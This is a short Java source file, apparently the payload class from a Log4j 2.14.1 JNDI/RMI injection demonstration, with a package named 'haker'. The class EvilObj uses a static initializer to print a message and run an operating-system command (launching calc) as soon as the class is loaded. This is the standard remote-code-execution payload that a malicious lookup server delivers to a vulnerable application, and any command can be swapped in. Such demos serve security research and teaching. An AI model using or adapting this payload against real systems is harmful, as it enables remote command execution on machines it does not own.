package com.upuphub.jmeta.rmi.log4j2141.haker;

import java.io.IOException;

public class EvilObj{
    static{
        System.out.println("It's Me");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
